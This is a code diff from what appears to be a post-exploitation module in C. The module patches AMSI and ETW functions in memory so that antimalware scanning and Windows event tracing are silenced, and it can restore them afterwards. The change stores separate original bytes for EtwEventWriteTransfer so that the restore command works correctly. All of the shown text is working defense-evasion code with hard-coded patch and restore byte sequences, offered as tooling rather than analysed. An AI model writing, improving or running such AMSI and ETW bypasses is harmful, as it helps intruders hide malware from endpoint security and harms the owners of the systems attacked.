@@ -35,8 +35,8 @@ void go(char* args, int len) {
     
     // Original bytes for restoring
     unsigned char o_amsi[] = { 0x4C, 0x8B, 0xDC, 0x49, 0x89, 0x5B, 0x08, 0x49, 0x89, 0x6B, 0x10, 0x49, 0x89, 0x73, 0x18 };
-    unsigned char o_etw[] = { 0x4C, 0x8B, 0xDC, 0x48, 0x83, 0xEC, 0x58, 0x4D, 0x89, 0x4B, 0xE8, 0x33, 0xC0 };
-
+    unsigned char o_etwW[] = { 0x4C, 0x8B, 0xDC, 0x48, 0x83, 0xEC, 0x58, 0x4D, 0x89, 0x4B, 0xE8, 0x33, 0xC0 };
+    unsigned char o_etwT[] = { 0x48, 0x89, 0x5C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x30 };
     if (cmd == 1) {
         ApplyPatch(p_amsi, p_ret, sizeof(p_ret), "[+] AMSI Patched.");
     } 
@@ -49,7 +49,7 @@ void go(char* args, int len) {
         ApplyPatch(p_etwT, p_ret, sizeof(p_ret), "[+] EtwEventWriteTransfer Patched.");
     } 
     else if (cmd == 4) {
-        ApplyPatch(p_etwW, o_etw, sizeof(o_etw), "[+] ETW Restored.");
-        ApplyPatch(p_etwT, o_etw, sizeof(o_etw), "[+] ETW Transfer Restored.");
+        ApplyPatch(p_etwW, o_etwW, sizeof(o_etwW), "[+] ETW Restored.");
+        ApplyPatch(p_etwT, o_etwT, sizeof(o_etwT), "[+] ETW Transfer Restored.");
     }
 }
